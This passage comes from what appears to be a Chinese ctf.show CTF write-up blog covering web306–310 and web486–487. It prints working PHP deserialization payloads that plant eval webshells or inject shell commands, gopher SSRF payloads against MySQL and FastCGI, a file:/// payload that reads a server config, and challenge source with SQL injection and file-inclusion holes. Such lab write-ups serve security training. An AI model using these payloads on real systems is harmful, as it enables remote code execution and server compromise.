class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;conn=<span class="keyword">new</span> <span class="title class_">log</span>();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$final</span> = <span class="keyword">new</span>  <span class="title class_">dao</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$final</span>));</span><br><span class="line"><span class="comment">#TzozOiJkYW8iOjE6e3M6OToiAGRhbwBjb25uIjtPOjM6ImxvZyI6Mjp7czo1OiJ0aXRsZSI7czo2OiJ6Zi5waHAiO3M6NDoiaW5mbyI7czoyNjoiPD9waHAgQGV2YWwoJF9QT1NUW3pmXSk7Pz4iO319</span></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414215324382.png" alt="image-20220414215324382"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414215333824.png" alt="image-20220414215333824"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414215417798.png" alt="image-20220414215417798"></p><h1 id="web307"><a href="#web307" class="headerlink" title="web307"></a>web307</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cache_dir</span> = <span class="string">&#x27;;mv /var/www/html/flag.php /var/www/html/flag.txt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = <span class="keyword">new</span> <span class="title class_">config</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$final</span> = <span class="keyword">new</span> <span class="title class_">dao</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$final</span>));</span><br><span class="line"><span class="comment">#TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czo5OiJjYWNoZV9kaXIiO3M6NTA6IjttdiAvdmFyL3d3dy9odG1sL2ZsYWcucGhwIC92YXIvd3d3L2h0bWwvZmxhZy50eHQ7Ijt9fQ==</span></span><br></pre></td></tr></table></figure><p>logout.php好用</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414222846939.png" alt="image-20220414222846939"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414222855740.png" alt="image-20220414222855740"></p><h1 id="web308"><a href="#web308" class="headerlink" title="web308"></a>web308</h1><h2 id="gopher打无密码mysql"><a href="#gopher打无密码mysql" class="headerlink" title="gopher打无密码mysql"></a>gopher打无密码mysql</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414223317135.png" alt="image-20220414223317135"></p><p>找一下ssrf的利用链</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410141702883.png" alt="image-20220410141702883"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$update_url</span> = <span class="string">&#x27;gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%49%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%27%7a%66%27%5d%29%3b%3f%3e%22%20%49%4e%54%4f%20%4f%55%54%46%49%4c%45%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%7a%66%2e%70%68%70%27%01%00%00%00%01&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title class_">config</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">dao</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">#TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czoxMDoidXBkYXRlX3VybCI7czo3NzI6ImdvcGhlcjovLzEyNy4wLjAuMTozMzA2L18lYTMlMDAlMDAlMDElODUlYTYlZmYlMDElMDAlMDAlMDAlMDElMjElMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlNzIlNmYlNmYlNzQlMDAlMDAlNmQlNzklNzMlNzElNmMlNWYlNmUlNjElNzQlNjklNzYlNjUlNWYlNzAlNjElNzMlNzMlNzclNmYlNzIlNjQlMDAlNjYlMDMlNWYlNmYlNzMlMDUlNGMlNjklNmUlNzUlNzglMGMlNWYlNjMlNmMlNjklNjUlNmUlNzQlNWYlNmUlNjElNmQlNjUlMDglNmMlNjklNjIlNmQlNzklNzMlNzElNmMlMDQlNWYlNzAlNjklNjQlMDUlMzIlMzclMzIlMzUlMzUlMGYlNWYlNjMlNmMlNjklNjUlNmUlNzQlNWYlNzYlNjUlNzIlNzMlNjklNmYlNmUlMDYlMzUlMmUlMzclMmUlMzIlMzIlMDklNWYlNzAlNmMlNjElNzQlNjYlNmYlNzIlNmQlMDYlNzglMzglMzYlNWYlMzYlMzQlMGMlNzAlNzIlNmYlNjclNzIlNjElNmQlNWYlNmUlNjElNmQlNjUlMDUlNmQlNzklNzMlNzElNmMlNDklMDAlMDAlMDAlMDMlNzMlNjUlNmMlNjUlNjMlNzQlMjAlMjIlM2MlM2YlNzAlNjglNzAlMjAlNjUlNzYlNjElNmMlMjglMjQlNWYlNTAlNGYlNTMlNTQlNWIlMjclN2ElNjYlMjclNWQlMjklM2IlM2YlM2UlMjIlMjAlNDklNGUlNTQlNGYlMjAlNGYlNTUlNTQlNDYlNDklNGMlNDUlMjAlMjclMmYlNzYlNjElNzIlMmYlNzclNzclNzclMmYlNjglNzQlNmQlNmMlMmYlN2ElNjYlMmUlNzAlNjglNzAlMjclMDElMDAlMDAlMDAlMDEiO319</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414224259755.png" alt="image-20220414224259755"></p><h1 id="web309"><a href="#web309" class="headerlink" title="web309"></a>web309</h1><h2 id="gophar打fastcgi"><a href="#gophar打fastcgi" class="headerlink" title="gophar打fastcgi"></a>gophar打fastcgi</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$update_url</span> = <span class="string">&#x27;gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F6%06%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH58%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3A%04%00%3C%3Fphp%20system%28%27cat%20f%2A%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title class_">config</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">dao</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">#TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czoxMDoidXBkYXRlX3VybCI7czo1NzU6ImdvcGhlcjovLzEyNy4wLjAuMTo5MDAwL18lMDElMDElMDAlMDElMDAlMDglMDAlMDAlMDAlMDElMDAlMDAlMDAlMDAlMDAlMDAlMDElMDQlMDAlMDElMDAlRjYlMDYlMDAlMEYlMTBTRVJWRVJfU09GVFdBUkVnbyUyMC8lMjBmY2dpY2xpZW50JTIwJTBCJTA5UkVNT1RFX0FERFIxMjcuMC4wLjElMEYlMDhTRVJWRVJfUFJPVE9DT0xIVFRQLzEuMSUwRSUwMkNPTlRFTlRfTEVOR1RINTglMEUlMDRSRVFVRVNUX01FVEhPRFBPU1QlMDlLUEhQX1ZBTFVFYWxsb3dfdXJsX2luY2x1ZGUlMjAlM0QlMjBPbiUwQWRpc2FibGVfZnVuY3Rpb25zJTIwJTNEJTIwJTBBYXV0b19wcmVwZW5kX2ZpbGUlMjAlM0QlMjBwaHAlM0EvL2lucHV0JTBGJTA5U0NSSVBUX0ZJTEVOQU1FaW5kZXgucGhwJTBEJTAxRE9DVU1FTlRfUk9PVC8lMDAlMDAlMDAlMDAlMDAlMDAlMDElMDQlMDAlMDElMDAlMDAlMDAlMDAlMDElMDUlMDAlMDElMDAlM0ElMDQlMDAlM0MlM0ZwaHAlMjBzeXN0ZW0lMjglMjdjYXQlMjBmJTJBJTI3JTI5JTNCZGllJTI4JTI3LS0tLS1NYWRlLWJ5LVNweUQzci0tLS0tJTBBJTI3JTI5JTNCJTNGJTNFJTAwJTAwJTAwJTAwIjt9fQ==</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414225717035.png" alt="image-20220414225717035"></p><h1 id="web310"><a href="#web310" class="headerlink" title="web310"></a>web310</h1><h2 id="ssrf读配置文件"><a href="#ssrf读配置文件" class="headerlink" title="ssrf读配置文件"></a>ssrf读配置文件</h2><p>9000和6379都是关着的。那我们可以试试读下配置文件</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$update_url</span> = <span class="string">&#x27;file:///etc/nginx/nginx.conf&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title class_">config</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">dao</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">#TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czoxMDoidXBkYXRlX3VybCI7czoyODoiZmlsZTovLy9ldGMvbmdpbngvbmdpbnguY29uZiI7fX0=</span></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414225358966.png" alt="image-20220414225358966"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$update_url</span> = <span class="string">&#x27;http://127.0.0.1:4476&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title class_">config</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">dao</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">#TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czoxMDoidXBkYXRlX3VybCI7czoyMToiaHR0cDovLzEyNy4wLjAuMTo0NDc2Ijt9fQ==</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414225448999.png" alt="image-20220414225448999"></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>中期测评</title>
      <link href="/ctfshow/ctf.show/%E4%B8%AD%E6%9C%9F%E6%B5%8B%E8%AF%84/"/>
      <url>/ctfshow/ctf.show/%E4%B8%AD%E6%9C%9F%E6%B5%8B%E8%AF%84/</url>
      
        <content type="html"><![CDATA[<h1 id="web486"><a href="#web486" class="headerlink" title="web486"></a>web486</h1><p>打开是一个登录</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410191856556.png" alt="image-20220410191856556"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410191923770.png" alt="image-20220410191923770"></p><p>翻一下源码,没发现什么</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410191952963.png" alt="image-20220410191952963"></p><p>注册之后登录也没有反应,重点并不是在这里</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410192022882.png" alt="image-20220410192022882"></p><p>发现地址有一个login,感觉像是文件包含</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410192056235.png" alt="image-20220410192056235"></p><p>尝试包含index.php发现出错,并且看到有一个templates目录, 还有render我们回到html试试</p><p>index.php</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410192221515.png" alt="image-20220410192221515"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 15:43:51</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-08 18:11:51</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;On&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/render_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$action</span>))&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里并没有有用的.我们去查看render_class文件</p><p>render&#x2F;render_class.php</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410192329514.png" alt="image-20220410192329514"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:52:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-08 18:10:19</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;file_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">templateUtil</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line"><span class="variable">$templateContent</span>=file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;templates/&#x27;</span>.<span class="variable">$template</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line"><span class="keyword">return</span> template<span class="title class_">Util</span>::<span class="title function_ invoke__">shade</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span>  <span class="function"><span class="keyword">function</span> <span class="title">shade</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$value</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$templateContent</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>render&#x2F;file_class文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410192407141.png" alt="image-20220410192407141"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:56:41</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-08 17:56:42</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fileUtil</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$filename</span>,<span class="variable">$content</span>,<span class="variable">$append</span> =<span class="number">0</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$append</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>,FILE_APPEND);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没什么思路,我们试一下包含flag文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410204859844.png" alt="image-20220410204859844"></p><h1 id="web487"><a href="#web487" class="headerlink" title="web487"></a>web487</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410205121149.png" alt="image-20220410205121149"></p><p>一样的页面,但是这次,我们搜到了一个cheak文件这次我们在试一下文件包含</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410205138507.png" alt="image-20220410205138507"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410205240261.png" alt="image-20220410205240261"></p><p>index.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 15:43:51</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-08 22:30:08</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/render_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/db_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$action</span>))&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;check&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id from user where username = md5(&#x27;<span class="subst">$username</span>&#x27;) and password=md5(&#x27;<span class="subst">$password</span>&#x27;) order by id limit 1&quot;</span>;<span class="comment">#这里明显的sql注入</span></span><br><span class="line"><span class="variable">$user</span>=db::<span class="title function_ invoke__">select_one</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>,<span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="variable">$username</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;login&#x27;</span>)&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&#x2F;render&#x2F;render_class.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:52:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-08 22:15:24</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;On&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;file_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;cache_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">templateUtil</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(cache::<span class="title function_ invoke__">cache_exists</span>(<span class="variable">$template</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> cache::<span class="title function_ invoke__">get_cache</span>(<span class="variable">$template</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$templateContent</span>=file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;templates/&#x27;</span>.<span class="variable">$template</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line"><span class="variable">$cache</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">shade</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line">cache::<span class="title function_ invoke__">create_cache</span>(<span class="variable">$template</span>,<span 